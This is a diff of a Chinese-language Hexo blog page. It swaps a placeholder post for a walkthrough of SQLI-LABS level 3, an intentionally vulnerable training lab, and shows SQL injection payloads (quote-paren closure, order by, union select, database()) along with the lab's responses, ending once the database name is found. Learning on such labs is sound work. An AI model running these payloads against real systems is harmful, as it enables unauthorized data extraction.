@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>test |  Blog of ZC</title>
+      <title>SQL注入 |  Blog of ZC</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/images/p.png" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-test"
+  id="post-SQL注入"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  test
+  SQL注入
 </h1>
  
 
@@ -73,15 +73,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/07/18/test/" class="article-date">
-  <time datetime="2021-07-18T12:12:32.000Z" itemprop="datePublished">2021-07-18</time>
+      <a href="/2021/07/18/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2021-07-18T11:51:04.000Z" itemprop="datePublished">2021-07-18</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1</span>
+            <span class="post-count">325</span>
         </span>
     </span>
 
@@ -97,13 +97,35 @@
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>ljxtz</p>
+  <h1 id="SQLI-LABS"><a href="#SQLI-LABS" class="headerlink" title="SQLI-LABS"></a>SQLI-LABS</h1><h2 id="第三关-单引号括号闭合"><a href="#第三关-单引号括号闭合" class="headerlink" title="第三关 单引号括号闭合"></a>第三关 单引号括号闭合</h2><p>先判断类型是字符型还是数字型。</p>
+<p><code>id=1&#39;</code></p>
+<p>结果发现报错如下：</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>
+<p>可以看到有括号，说明是由括号闭合。</p>
+<p>于是再输入：</p>
+<p><code>id=1&#39;) -- -</code></p>
+<p>发现正常返回<code>id=1</code>的用户数据。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:Dumb</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:Dumb</span></span><br></pre></td></tr></table></figure>
+
+<p>输入： <code>id=1&#39;) and 1=2 -- -</code> 发现没有查询结果，说明存在注入点。</p>
+<p>于是便开始注入，先通过<code>order by</code>看看有多少列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#order by 数字 理解为按第几列的属性排序</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>id=1&#39;) order by 5 -- -</code>,得到报错<code> Unknown column &#39;5&#39; in &#39;order clause&#39;</code> 说明不存在第五列，通过二分法查找，最终确定一共有3列。</p>
+<p>然后再判断回显位 <code>id=-1&#39;) union select 1,2,3 -- -</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#id=-1为了让他查询不到结果不显示，看union select后前端反馈的是哪两个数据。</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>说明回显位在2，3。于是我们对这两个位置进行注入来获得信息。<br>爆库名<br><code>id=-1&#39;) union select 1,database(),3 -- -</code></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:security</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
+<p>可以知道库名为<code>security</code> </p>
  
       <!-- reward -->
       
@@ -132,6 +154,8 @@
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li></ul>
+
     </footer>
   </div>
 
@@ -139,9 +163,9 @@
   <nav class="article-nav">
     
     
-      <a href="/2021/07/18/first-page/" class="article-nav-link">
+      <a href="/2021/07/18/hello-world/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">first-page</div>
+        <div class="article-nav-title">Hello World</div>
       </a>
     
   </nav>
